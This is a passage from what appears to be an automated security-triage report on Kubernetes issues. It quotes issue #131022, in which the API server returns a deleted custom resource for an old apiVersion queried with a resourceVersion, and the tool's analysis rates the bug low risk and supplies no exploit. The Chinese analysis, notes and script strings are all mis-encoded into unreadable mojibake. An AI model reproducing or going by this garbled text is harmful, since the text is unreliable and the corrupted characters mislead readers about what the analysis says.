8.  **æ¸…ç†èµ„æº:** åœ¨è„šæœ¬ç»“æŸæ—¶ï¼ˆæ— è®ºæˆåŠŸã€å¤±è´¥æˆ–è¶…æ—¶ï¼‰ï¼Œå°è¯•åˆ é™¤åˆ›å»ºçš„ DaemonSet ä»¥æ¸…ç†ç¯å¢ƒã€‚

**é‡è¦æç¤º:**
*   è¿è¡Œæ­¤è„šæœ¬éœ€è¦å®‰è£… `kubernetes` Python åº“ (`pip install kubernetes`)ã€‚
*   è¿è¡Œæ­¤è„šæœ¬éœ€è¦å…·æœ‰åœ¨ç›®æ ‡é›†ç¾¤ `default` å‘½åç©ºé—´ä¸­åˆ›å»ºå’Œåˆ é™¤ DaemonSet ä»¥åŠåˆ—å‡º Pod çš„æƒé™ã€‚
*   æ­¤è„šæœ¬å‡è®¾ Kubernetes é›†ç¾¤å·²æŒ‰ Issue æè¿°é…ç½®å¥½ï¼ˆå³å¯ç”¨äº† `DynamicResourceAllocation` feature gateï¼‰ã€‚è„šæœ¬æœ¬èº«**ä¸ä¼š**ä¿®æ”¹é›†ç¾¤çš„ feature gate é…ç½®ã€‚
*   æ­¤è„šæœ¬è¿˜å‡è®¾é›†ç¾¤ä¸­å­˜åœ¨ä¸€ä¸ªåä¸º `demo-static` çš„ `ResourceClaimTemplate` èµ„æºã€‚å¦‚æœä¸å­˜åœ¨ï¼ŒPod å¯èƒ½å› å…¶ä»–åŸå› ï¼ˆæ— æ³•æ‰¾åˆ°æ¨¡æ¿ï¼‰è€Œå¤±è´¥ï¼Œä½†è¿™ä¸æœ¬ Issue å…³æ³¨çš„ `resourceClaimTemplateName` å­—æ®µæ˜¯å¦ä¸¢å¤±æ˜¯ä¸åŒçš„é—®é¢˜ã€‚ä¸ºäº†çº¯ç²¹éªŒè¯å­—æ®µä¸¢å¤±é—®é¢˜ï¼Œæ¨¡æ¿æ˜¯å¦å­˜åœ¨å¯èƒ½ä¸æ˜¯ä¸¥æ ¼å¿…éœ€çš„ï¼Œä½†ä¸ºäº†æ¨¡æ‹Ÿå®Œæ•´åœºæ™¯ï¼Œæ³¨é‡Šä¸­æåˆ°äº†éœ€è¦é¢„å…ˆåˆ›å»ºæ¨¡æ¿ã€‚
*   è„šæœ¬çš„è®¾è®¡ç›®çš„æ˜¯åœ¨æœ¬åœ°ç¯å¢ƒä¸­éªŒè¯è¯¥åŠŸèƒ½é—®é¢˜ï¼Œè€Œéè¿›è¡Œå®‰å…¨æ¸—é€æµ‹è¯•ã€‚

---


## Issue #131022 Get with resourceVersion on old CustomResource APIVersion shows deleted object.

- Issue é“¾æ¥ï¼š[#131022](https://github.com/kubernetes/kubernetes/issues/131022)

### Issue å†…å®¹

#### What happened?

kube-apiserver still shows an CustomResource object which already got deleted.
But only if using the `resourceVersion` parameter and an old apiVersion of the Custom Resource.

Example `kubectl get` in the old and new api version does not show anything:
```sh
â¯ kubectl get virtualmachines.v1alpha2.vmoperator.vmware.com -A
No resources found
â¯ kubectl get virtualmachines.v1alpha4.vmoperator.vmware.com -A
No resources found
```

Emulating what a controller does (List and Watch with resourceVersion) for the current api version (v1alpha4) behaves as expected:

```sh
â¯ kubectl get --raw '/apis/vmoperator.vmware.com/v1alpha4/virtualmachines'
{"apiVersion":"vmoperator.vmware.com/v1alpha4","items":[],"kind":"VirtualMachineList","metadata":{"continue":"","resourceVersion":"3565963"}}
â¯ kubectl get --raw '/apis/vmoperator.vmware.com/v1alpha4/virtualmachines?resourceVersion=3565963'
{"apiVersion":"vmoperator.vmware.com/v1alpha4","items":[],"kind":"VirtualMachineList","metadata":{"continue":"","resourceVersion":"3566130"}}
```

Doing the same but for v1alpha2 results in showing an object which got deleted before:
```sh
â¯ k get --raw '/apis/vmoperator.vmware.com/v1alpha2/virtualmachines'
{"apiVersion":"vmoperator.vmware.com/v1alpha2","items":[],"kind":"VirtualMachineList","metadata":{"continue":"","resourceVersion":"3566693"}}
â¯ k get --raw '/apis/vmoperator.vmware.com/v1alpha2/virtualmachines?resourceVersion=3566693'
{"apiVersion":"vmoperator.vmware.com/v1alpha2","items":[{"apiVersion":"vmoperator.vmware.com/v1alpha2","kind":"VirtualMachine","metadata":{"annotations":{"virtualmachine.vmoperator.vmware.com/first-boot-done":"true","vmoperator.vmware.com/conversion":"{\"apiVersion\":\"vmoperator.vmware.com/v1alpha4\",\"kind\":\"VirtualMachine\",\"spec\":{\"biosUUID\":\"4b5ce20c-f3a8-42e7-8a1b-41c08b4a4a0d\",\"bootstrap\":{\"cloudInit\":{\"instanceID\":\"4b5ce20c-f3a8-42e7-8a1b-41c08b4a4a0d\",\"rawCloudConfig\":{\"key\":\"user-data\",\"name\":\"testcluster-mkstib-zjtvp-qmcjh\"}}},\"className\":\"best-effort-small\",\"image\":{\"kind\":\"ClusterVirtualMachineImage\",\"name\":\"vmi-86fe7a39856629414\"},\"imageName\":\"vmi-86fe7a39856629414\",\"instanceUUID\":\"d829bd73-7b48-460d-a57a-d1ba90307d63\",\"network\":{\"interfaces\":[{\"name\":\"eth0\",\"network\":{\"apiVersion\":\"netoperator.vmware.com/v1alpha1\",\"kind\":\"Network\",\"name\":\"primary\"}}]},\"powerOffMode\":\"Hard\",\"powerState\":\"PoweredOn\",\"readinessProbe\":{\"tcpSocket\":{\"port\":6443}},\"reserved\":{\"resourcePolicyName\":\"testcluster-mkstib\"},\"restartMode\":\"TrySoft\",\"storageClass\":\"storage-profile\",\"suspendMode\":\"TrySoft\"},\"status\":{\"biosUUID\":\"4b5ce20c-f3a8-42e7-8a1b-41c08b4a4a0d\",\"changeBlockTracking\":false,\"class\":{\"apiVersion\":\"vmoperator.vmware.com/v1alpha4\",\"kind\":\"VirtualMachineClass\",\"name\":\"best-effort-small\"},\"conditions\":[{\"lastTransitionTime\":\"2025-03-20T20:45:32Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"Ready\"},{\"lastTransitionTime\":\"2025-03-20T20:41:51Z\",\"message\":\"\",\"reason\":\"NoBootstrapStatus\",\"status\":\"Unknown\",\"type\":\"GuestBootstrap\"},{\"lastTransitionTime\":\"2025-03-20T20:41:51Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"GuestCustomization\"},{\"lastTransitionTime\":\"2025-03-20T20:40:30Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"VirtualMachineBootstrapReady\"},{\"lastTransitionTime\":\"2025-03-20T20:41:51Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"VirtualMachineClassConfigurationSynced\"},{\"lastTransitionTime\":\"2025-03-20T20:40:30Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"VirtualMachineClassReady\"},{\"lastTransitionTime\":\"2025-03-20T20:40:31Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"VirtualMachineConditionPlacementReady\"},{\"lastTransitionTime\":\"2025-03-20T20:40:30Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"VirtualMachineConditionVMSetResourcePolicyReady\"},{\"lastTransitionTime\":\"2025-03-20T20:41:51Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"VirtualMachineCreated\"},{\"lastTransitionTime\":\"2025-03-20T11:35:39Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"VirtualMachineImageReady\"},{\"lastTransitionTime\":\"2025-03-20T20:40:31Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"VirtualMachineNetworkReady\"},{\"lastTransitionTime\":\"2025-03-20T20:41:51Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"VirtualMachineReconcileReady\"},{\"lastTransitionTime\":\"2025-03-20T20:40:30Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"VirtualMachineStorageReady\"},{\"lastTransitionTime\":\"2025-03-20T20:42:14Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"VirtualMachineTools\"}],\"hardwareVersion\":22,\"host\":\"10.160.248.110\",\"instanceUUID\":\"d829bd73-7b48-460d-a57a-d1ba90307d63\",\"network\":{\"config\":{\"dns\":{\"hostName\":\"testcluster-mkstib-zjtvp-qmcjh\",\"nameservers\":[\"Y.Y.Y.10\",\"Y.Y.Y.20\"]},\"interfaces\":[{\"dns\":{\"nameservers\":[\"Y.Y.Y.10\",\"Y.Y.Y.20\"]},\"ip\":{\"addresses\":[\"X.X.X.53/16\"],\"gateway4\":\"192.168.1.1\"},\"name\":\"eth0\"}]},\"interfaces\":[{\"deviceKey\":4000,\"ip\":{\"addresses\":[{\"address\":\"X.X.X.53\",\"lifetime\":null,\"state\":\"preferred\"},{\"address\":\"fe80::250:56ff:febe:e882\",\"lifetime\":null,\"state\":\"unknown\"}],\"macAddr\":\"00:50:56:be:e8:82\"},\"name\":\"eth0\"}],\"ipStacks\":[{\"dns\":{\"domainName\":\".\",\"hostName\":\"testcluster-mkstib-zjtvp-qmcjh\",\"nameservers\":[\"Y.Y.Y.10\",\"Y.Y.Y.20\"],\"searchDomains\":[\".\"]},\"ipRoutes\":[{\"gateway\":{\"address\":\"192.168.1.1\",\"device\":\"0\"},\"networkAddress\":\"0.0.0.0/0\"},{\"gateway\":{\"device\":\"0\"},\"networkAddress\":\"192.168.0.0/16\"}]}],\"primaryIP4\":\"X.X.X.53\"},\"powerState\":\"PoweredOn\",\"storage\":{\"usage\":{\"disks\":\"7Gi\",\"other\":\"4Gi\",\"total\":\"11Gi\"}},\"uniqueID\":\"vm-258\",\"volumes\":[{\"attached\":true,\"diskUUID\":\"6000C294-9a81-cc92-cc63-a48796db9ffa\",\"limit\":\"20Gi\",\"name\":\"testcluster-mkstib-zjtvp-qmcjh\",\"type\":\"Classic\",\"used\":\"7Gi\"}],\"zone\":\"domain-c54\"}}","vmoperator.vmware.com/created-at-build-version":"0.1.0+5e47405+1.8.6+6b764225+84090880","vmoperator.vmware.com/created-at-schema-version":"v1alpha4","vmoperator.vmware.com/last-resized-vm-class":"{\"name\":\"best-effort-small\",\"uid\":\"23fa178a-e581-4114-8171-aab2e9ab95c3\",\"generation\":1}","vmoperator.vmware.com/manager-id":"30ac0023-23d4-4a84-9ec3-a30560c7a375","vsphere-cluster-module-group":"control-plane-group","vsphere-tag":"CtrlVmVmAATag"},"creationTimestamp":"2025-03-20T20:40:30Z","deletionGracePeriodSeconds":0,"deletionTimestamp":"2025-03-20T20:57:24Z","finalizers":["vmoperator.vmware.com/virtualmachine"],"generation":2,"labels":{"capv.vmware.com/cluster.name":"testcluster-mkstib","capv.vmware.com/cluster.role":"controlplane","capw.vmware.com/cluster.name":"testcluster-mkstib","capw.vmware.com/cluster.role":"controlplane","cluster.x-k8s.io/cluster-name":"testcluster-mkstib","topology.kubernetes.io/zone":"domain-c54"},"managedFields":[{"apiVersion":"vmoperator.vmware.com/v1alpha2","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:annotations":{".":{},"f:vsphere-cluster-module-group":{},"f:vsphere-tag":{}},"f:labels":{".":{},"f:capv.vmware.com/cluster.name":{},"f:capv.vmware.com/cluster.role":{},"f:capw.vmware.com/cluster.name":{},"f:capw.vmware.com/cluster.role":{},"f:cluster.x-k8s.io/cluster-name":{},"f:topology.kubernetes.io/zone":{}},"f:ownerReferences":{".":{},"k:{\"uid\":\"e7e468b1-6d87-4864-9121-d008ef5a351e\"}":{}}},"f:spec":{".":{},"f:bootstrap":{".":{},"f:cloudInit":{".":{},"f:rawCloudConfig":{".":{},"f:key":{},"f:name":{}}}},"f:className":{},"f:imageName":{},"f:network":{".":{},"f:interfaces":{".":{},"k:{\"name\":\"eth0\"}":{".":{},"f:name":{},"f:network":{".":{},"f:apiVersion":{},"f:kind":{},"f:name":{}}}}},"f:powerOffMode":{},"f:powerState":{},"f:readinessProbe":{".":{},"f:tcpSocket":{".":{},"f:port":{}}},"f:reserved":{".":{},"f:resourcePolicyName":{}},"f:restartMode":{},"f:storageClass":{},"f:suspendMode":{}}},"manager":"manager","operation":"Update","time":"2025-03-20T20:40:30Z"},{"apiVersion":"vmoperator.vmware.com/v1alpha4","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:annotations":{"f:virtualmachine.vmoperator.vmware.com/first-boot-done":{},"f:vmoperator.vmware.com/last-resized-vm-class":{},"f:vmoperator.vmware.com/manager-id":{}},"f:finalizers":{".":{},"v:\"vmoperator.vmware.com/virtualmachine\"":{}}}},"manager":"manager","operation":"Update","time":"2025-03-20T20:41:51Z"},{"apiVersion":"vmoperator.vmware.com/v1alpha4","fieldsType":"FieldsV1","fieldsV1":{"f:status":{"f:biosUUID":{},"f:changeBlockTracking":{},"f:class":{".":{},"f:apiVersion":{},"f:kind":{},"f:name":{}},"f:conditions":{},"f:hardwareVersion":{},"f:host":{},"f:instanceUUID":{},"f:network":{".":{},"f:config":{".":{},"f:dns":{".":{},"f:hostName":{},"f:nameservers":{}},"f:interfaces":{}},"f:interfaces":{},"f:ipStacks":{},"f:primaryIP4":{}},"f:powerState":{},"f:storage":{".":{},"f:usage":{".":{},"f:disks":{},"f:other":{},"f:total":{}}},"f:uniqueID":{},"f:volumes":{".":{},"k:{\"name\":\"testcluster-mkstib-zjtvp-qmcjh\",\"type\":\"Classic\"}":{".":{},"f:attached":{},"f:diskUUID":{},"f:limit":{},"f:name":{},"f:type":{},"f:used":{}}},"f:zone":{}}},"manager":"manager","operation":"Update","subresource":"status","time":"2025-03-20T20:45:33Z"}],"name":"testcluster-mkstib-zjtvp-qmcjh","namespace":"utkg-update-mkstib","ownerReferences":[{"apiVersion":"vmware.infrastructure.cluster.x-k8s.io/v1beta1","blockOwnerDeletion":true,"controller":true,"kind":"VSphereMachine","name":"testcluster-mkstib-zjtvp-qmcjh","uid":"e7e468b1-6d87-4864-9121-d008ef5a351e"}],"resourceVersion":"379688","uid":"f4ef3b9b-e432-41fb-92ef-45c3c4033bf3"},"spec":{"bootstrap":{"cloudInit":{"rawCloudConfig":{"key":"user-data","name":"testcluster-mkstib-zjtvp-qmcjh"}}},"className":"best-effort-small","imageName":"vmi-86fe7a39856629414","network":{"interfaces":[{"name":"eth0","network":{"apiVersion":"netoperator.vmware.com/v1alpha1","kind":"Network","name":"primary"}}]},"powerOffMode":"Hard","powerState":"PoweredOn","readinessProbe":{"tcpSocket":{"port":6443}},"reserved":{"resourcePolicyName":"testcluster-mkstib"},"restartMode":"TrySoft","storageClass":"wcpglobal-storage-profile","suspendMode":"TrySoft"},"status":{"biosUUID":"4b5ce20c-f3a8-42e7-8a1b-41c08b4a4a0d","changeBlockTracking":false,"class":{"apiVersion":"vmoperator.vmware.com/v1alpha4","kind":"VirtualMachineClass","name":"best-effort-small"},"conditions":[{"lastTransitionTime":"2025-03-20T20:45:32Z","message":"","reason":"True","status":"True","type":"Ready"},{"lastTransitionTime":"2025-03-20T20:41:51Z","message":"","reason":"NoBootstrapStatus","status":"Unknown","type":"GuestBootstrap"},{"lastTransitionTime":"2025-03-20T20:41:51Z","message":"","reason":"True","status":"True","type":"GuestCustomization"},{"lastTransitionTime":"2025-03-20T20:40:30Z","message":"","reason":"True","status":"True","type":"VirtualMachineBootstrapReady"},{"lastTransitionTime":"2025-03-20T20:41:51Z","message":"","reason":"True","status":"True","type":"VirtualMachineClassConfigurationSynced"},{"lastTransitionTime":"2025-03-20T20:40:30Z","message":"","reason":"True","status":"True","type":"VirtualMachineClassReady"},{"lastTransitionTime":"2025-03-20T20:40:31Z","message":"","reason":"True","status":"True","type":"VirtualMachineConditionPlacementReady"},{"lastTransitionTime":"2025-03-20T20:40:30Z","message":"","reason":"True","status":"True","type":"VirtualMachineConditionVMSetResourcePolicyReady"},{"lastTransitionTime":"2025-03-20T20:41:51Z","message":"","reason":"True","status":"True","type":"VirtualMachineCreated"},{"lastTransitionTime":"2025-03-20T11:35:39Z","message":"","reason":"True","status":"True","type":"VirtualMachineImageReady"},{"lastTransitionTime":"2025-03-20T20:40:31Z","message":"","reason":"True","status":"True","type":"VirtualMachineNetworkReady"},{"lastTransitionTime":"2025-03-20T20:41:51Z","message":"","reason":"True","status":"True","type":"VirtualMachineReconcileReady"},{"lastTransitionTime":"2025-03-20T20:40:30Z","message":"","reason":"True","status":"True","type":"VirtualMachineStorageReady"},{"lastTransitionTime":"2025-03-20T20:42:14Z","message":"","reason":"True","status":"True","type":"VirtualMachineTools"}],"hardwareVersion":22,"host":"10.160.248.110","image":{"apiVersion":"vmoperator.vmware.com/v1alpha4","kind":"ClusterVirtualMachineImage","name":"vmi-86fe7a39856629414"},"instanceUUID":"d829bd73-7b48-460d-a57a-d1ba90307d63","network":{"config":{"dns":{"hostName":"testcluster-mkstib-zjtvp-qmcjh","nameservers":["Y.Y.Y.10","Y.Y.Y.20"]},"interfaces":[{"dns":{"nameservers":["Y.Y.Y.10","Y.Y.Y.20"]},"ip":{"addresses":["X.X.X.53/16"],"gateway4":"192.168.1.1"},"name":"eth0"}]},"interfaces":[{"deviceKey":4000,"ip":{"addresses":[{"address":"X.X.X.53","state":"preferred"},{"address":"fe80::250:56ff:febe:e882","state":"unknown"}],"macAddr":"00:50:56:be:e8:82"},"name":"eth0"}],"ipStacks":[{"dns":{"domainName":"testcluster-mkstib-zjtvp-qmcjh","hostName":".","nameservers":["Y.Y.Y.10","Y.Y.Y.20"],"searchDomains":["."]},"ipRoutes":[{"gateway":{"address":"192.168.1.1","device":"0"},"networkAddress":"0.0.0.0/0"},{"gateway":{"device":"0"},"networkAddress":"192.168.0.0/16"}]}],"primaryIP4":"X.X.X.53"},"powerState":"PoweredOn","uniqueID":"vm-258","zone":"domain-c54"}}],"kind":"VirtualMachineList","metadata":{"continue":"","resourceVersion":"3566778"}}
```



#### What did you expect to happen?

The following command from the above example should not show an item.

```sh
k get --raw '/apis/vmoperator.vmware.com/v1alpha2/virtualmachines?resourceVersion=3566693'
```


#### How can we reproduce it (as minimally and precisely as possible)?

Not sure how to reproduce this.

#### Anything else we need to know?

The issue is problematic for our controller, which waits until the object is not there anymore (get returns the NotFound error).

The issue does not auto-resolve itself, even after multiple days (occurred on friday, does still exist today, monday).

According to `etcdctl` the object is not stored anymore in etcd.

(used command `/usr/local/bin/etcdctl get --prefix '/registry/vmoperator.vmware.com/virtualmachines/'`)


#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.5+vmware.4-fips
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.5+vmware.4-fips
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="VMware Photon OS"
VERSION="5.0"
ID=photon
VERSION_ID=5.0
PRETTY_NAME="VMware Photon OS/Linux"
ANSI_COLOR="1;34"
HOME_URL="https://vmware.github.io/photon/"
BUG_REPORT_URL="https://github.com/vmware/photon/issues"
$ uname -a
Linux 423e9fe96783368c4ff3ba2ec60ef71c 6.1.128-2.ph5 #1-photon SMP Wed Feb 19 07:00:29 UTC 2025 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
1.  **é—®é¢˜æè¿°**: è¯¥ Issue æè¿°äº† Kubernetes API Server åœ¨å¤„ç† Custom Resource (CR) æ—¶çš„ä¸€ä¸ªæ½œåœ¨é—®é¢˜ã€‚å½“ç”¨æˆ·ä½¿ç”¨ä¸€ä¸ªå·²ç»è¢«åºŸå¼ƒçš„æ—§ API ç‰ˆæœ¬ï¼ˆä¾‹å¦‚ `v1alpha2`ï¼‰å¹¶é€šè¿‡æŒ‡å®š `resourceVersion` å‚æ•°æ¥æŸ¥è¯¢ CR åˆ—è¡¨æ—¶ï¼ŒAPI Server å¯èƒ½ä¼šè¿”å›ä¸€ä¸ªå·²ç»è¢«æ ‡è®°ä¸ºåˆ é™¤ï¼ˆå­˜åœ¨ `deletionTimestamp`ï¼‰ä½†å°šæœªè¢«å®Œå…¨æ¸…ç†çš„ CR å¯¹è±¡ã€‚è€Œåœ¨ä¸æŒ‡å®š `resourceVersion` æˆ–ä½¿ç”¨å½“å‰ï¼ˆæ–°ï¼‰çš„ API ç‰ˆæœ¬ï¼ˆä¾‹å¦‚ `v1alpha4`ï¼‰æŸ¥è¯¢æ—¶ï¼Œè¯¥å·²åˆ é™¤å¯¹è±¡åˆ™ä¸ä¼šè¢«è¿”å›ã€‚
2.  **æ ¹æœ¬åŸå› æ¨æµ‹**: é—®é¢˜å¯èƒ½æºäº API Server çš„å­˜å‚¨å±‚ï¼ˆetcdï¼‰ã€ç¼“å­˜æœºåˆ¶æˆ– CRD ç‰ˆæœ¬è½¬æ¢ï¼ˆConversion Webhookï¼‰é€»è¾‘ã€‚è™½ç„¶ Issue æäº¤è€…ç¡®è®¤å¯¹è±¡å·²ä¸åœ¨ etcd ä¸­ï¼Œä½† API Server çš„ watch ç¼“å­˜æˆ–å¤„ç†ç‰ˆæœ¬è½¬æ¢çš„è¿‡ç¨‹ä¸­å¯èƒ½å­˜åœ¨çŠ¶æ€ä¸ä¸€è‡´ï¼Œå¯¼è‡´åœ¨ç‰¹å®šæ¡ä»¶ä¸‹ï¼ˆæ—§ç‰ˆæœ¬ + resourceVersionï¼‰æŸ¥è¯¢æ—¶ï¼Œèƒ½ä»ç¼“å­˜æˆ–å…¶ä»–ä¸­é—´çŠ¶æ€ä¸­è·å–åˆ°å·²è¢«åˆ é™¤çš„å¯¹è±¡ä¿¡æ¯ã€‚`resourceVersion` å‚æ•°é€šå¸¸ç”¨äºç¡®ä¿ä¸€è‡´æ€§è¯»å–æˆ–å¯åŠ¨ watchï¼ŒæŸ¥è¯¢ç‰¹å®š `resourceVersion` å¯èƒ½è§¦å‘äº†è®¿é—®æ—§çŠ¶æ€ç¼“å­˜çš„é€»è¾‘ã€‚
3.  **æ½œåœ¨é£é™©**:
    *   **ä¿¡æ¯æ³„éœ²ï¼ˆStale Dataï¼‰**: æ”»å‡»è€…ï¼ˆæˆ–ä¾èµ–æ­¤ API çš„ Controllerï¼‰å¦‚æœæ‹¥æœ‰å¯¹è¯¥ CR çš„è¯»å–æƒé™ï¼Œå¯ä»¥é€šè¿‡æ„é€ ç‰¹å®šè¯·æ±‚ï¼ˆä½¿ç”¨æ—§ API ç‰ˆæœ¬å’Œç‰¹å®šçš„ `resourceVersion`ï¼‰è·å–åˆ°ä¸€ä¸ªå·²ç»è¢«åˆ é™¤çš„å¯¹è±¡ä¿¡æ¯ã€‚è™½ç„¶å¯¹è±¡å·²è¢«åˆ é™¤ï¼Œä½†å…¶åŒ…å«çš„ `spec` å’Œ `status` å¯èƒ½åŒ…å«ä¸€äº›åœ¨åˆ é™¤åä¸åº”å†è¢«è®¿é—®çš„é…ç½®ä¿¡æ¯æˆ–çŠ¶æ€æ•°æ®ã€‚
    *   **æ§åˆ¶å™¨é€»è¾‘é”™è¯¯**: å¦‚ Issue ä¸­æ‰€è¿°ï¼Œä¾èµ–æ­¤ API è¡Œä¸ºçš„ Controller å¯èƒ½ä¼šå› ä¸ºè·å–åˆ°å·²åˆ é™¤çš„å¯¹è±¡è€Œåšå‡ºé”™è¯¯çš„åˆ¤æ–­ï¼Œä¾‹å¦‚è®¤ä¸ºèµ„æºä»ç„¶å­˜åœ¨ï¼Œä»è€Œå¯¼è‡´èµ„æºæ¸…ç†å¤±è´¥ã€çŠ¶æ€ä¸åŒæ­¥æˆ–å…¶ä»–éé¢„æœŸè¡Œä¸ºã€‚
4.  **é£é™©è¯„ä¼°**:
    *   **æ”»å‡»å‘é‡ (AV:N)**: é€šè¿‡ç½‘ç»œè®¿é—® Kubernetes APIã€‚
    *   **æ”»å‡»å¤æ‚åº¦ (AC:H)**: éœ€è¦çŸ¥é“å­˜åœ¨æ—§çš„ API ç‰ˆæœ¬ï¼Œå¹¶ä¸”éœ€è¦è·å–åˆ°ä¸€ä¸ªåˆé€‚çš„ `resourceVersion` (é€šå¸¸æ¥è‡ªä¹‹å‰çš„ LIST æ“ä½œ)ã€‚å¤ç°æ¡ä»¶ä¼¼ä¹æ¯”è¾ƒç‰¹å®šï¼Œæäº¤è€…ä¹Ÿæ— æ³•ç¨³å®šå¤ç°ã€‚
    *   **æƒé™è¦æ±‚ (PR:L)**: éœ€è¦æ‹¥æœ‰å¯¹è¯¥ç‰¹å®š Custom Resource çš„ `get` æˆ– `list` æƒé™ã€‚è¿™é€šå¸¸æ˜¯å‘½åç©ºé—´å†…çš„å¼€å‘è€…ã€æœåŠ¡è´¦æˆ·æˆ– CRD ç®¡ç†å‘˜æ‹¥æœ‰çš„æƒé™ï¼Œè€Œéä»»æ„ç”¨æˆ·ã€‚
    *   **ç”¨æˆ·äº¤äº’ (UI:N)**: æ— éœ€ç”¨æˆ·äº¤äº’ã€‚
    *   **èŒƒå›´ (S:U)**: å½±å“èŒƒå›´æ˜¯ API Server ç»„ä»¶æœ¬èº«ï¼Œæœªæ”¹å˜æƒé™èŒƒå›´ã€‚
    *   **æœºå¯†æ€§å½±å“ (C:L)**: å¯ä»¥è¯»å–åˆ°å·²è¢«åˆ é™¤çš„å¯¹è±¡ä¿¡æ¯ï¼Œå±äºè¿‡æœŸ/é™ˆæ—§æ•°æ®çš„æ³„éœ²ã€‚å½±å“ç¨‹åº¦å–å†³äºè¯¥ CR ä¸­åŒ…å«çš„æ•°æ®æ•æ„Ÿæ€§ï¼Œä½†é€šå¸¸ä½äºè¯»å–æ´»è·ƒå¯¹è±¡çš„æ•æ„Ÿæ•°æ®ã€‚
    *   **å®Œæ•´æ€§å½±å“ (I:N)**: åªæ˜¯è¯»å–ä¿¡æ¯ï¼Œæœ¬èº«ä¸å½±å“æ•°æ®å®Œæ•´æ€§ã€‚æ§åˆ¶å™¨å¯èƒ½åŸºäºæ­¤ä¿¡æ¯åšå‡ºé”™è¯¯æ“ä½œï¼Œä½†è¿™å±äºé—´æ¥å½±å“ã€‚
    *   **å¯ç”¨æ€§å½±å“ (A:N)**: ä¸ç›´æ¥å¯¼è‡´ API Server æˆ–ç›¸å…³èµ„æºä¸å¯ç”¨ã€‚å¯èƒ½å¯¼è‡´ä¾èµ–æ­¤è¡Œä¸ºçš„æ§åˆ¶å™¨åŠŸèƒ½å¼‚å¸¸ã€‚
    *   **CVSS 3.1 è¯„åˆ†**: AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N -> 3.1 (Low)
5.  **ç»“è®º**: æ ¹æ® CVSS 3.1 è¯„åˆ†ï¼ˆ3.1ï¼‰ï¼Œæ­¤é—®é¢˜å±äº **ä½é£é™©**ã€‚å®ƒç¡®å®æ˜¯ä¸€ä¸ª Bugï¼Œå¯èƒ½å¯¼è‡´é™ˆæ—§ä¿¡æ¯æ³„éœ²å’Œæ§åˆ¶å™¨é€»è¾‘é—®é¢˜ï¼Œä½†åˆ©ç”¨æ¡ä»¶è¾ƒä¸ºå¤æ‚ï¼Œéœ€è¦ç‰¹å®šæƒé™ï¼Œä¸”æ³„éœ²çš„æ˜¯å·²åˆ é™¤å¯¹è±¡çš„ä¿¡æ¯ï¼Œä¸æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€ææƒç­‰é«˜å±æ“ä½œã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬3æ¡å’Œç¬¬5æ¡ï¼Œè™½ç„¶æ˜¯å®‰å…¨ç›¸å…³é—®é¢˜ï¼Œä½†è¯„çº§ä¸º Lowï¼Œä¸åˆ¤å®šä¸ºé«˜é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤é—®é¢˜è¢«è¯„å®šä¸ºä½é£é™©ï¼Œå› æ­¤ä¸æä¾›å¤ç°è„šæœ¬ã€‚
# åŸå› ï¼šè¯¥é—®é¢˜ä¸»è¦å¯¼è‡´å·²åˆ é™¤å¯¹è±¡ï¼ˆé™ˆæ—§æ•°æ®ï¼‰åœ¨ç‰¹å®šæŸ¥è¯¢æ¡ä»¶ä¸‹å¯è§ï¼Œ
# å±äºä¿¡æ¯æ³„éœ²çš„ä¸€ç§ï¼Œä½†åˆ©ç”¨æ¡ä»¶è‹›åˆ»ï¼ˆéœ€è¦æ—§APIç‰ˆæœ¬+ç‰¹å®šresourceVersion+è¯»å–æƒé™ï¼‰ï¼Œ
# CVSSè¯„åˆ†ä¸º3.1 (Low)ï¼Œæœªè¾¾åˆ°é«˜é£é™©æ ‡å‡†ï¼ˆå¦‚å‘½ä»¤æ‰§è¡Œã€ææƒã€å½±å“å…¶ä»–ç§Ÿæˆ·ç­‰ï¼‰ã€‚
# æ ¹æ®è¦æ±‚ï¼Œä»…å¯¹é«˜é£é™©é—®é¢˜æä¾›å¤ç°è„šæœ¬ã€‚

import time
import sys

print("è¯¥Issueè¢«è¯„ä¼°ä¸ºä½é£é™©ï¼Œæ ¹æ®è¦æ±‚ä¸ç”Ÿæˆå¤ç°POCã€‚")
print("é—®é¢˜æè¿°ï¼šä½¿ç”¨æ—§APIç‰ˆæœ¬å’ŒresourceVersionæŸ¥è¯¢æ—¶ï¼Œå¯èƒ½è·å–åˆ°å·²åˆ é™¤çš„CRå¯¹è±¡ã€‚")
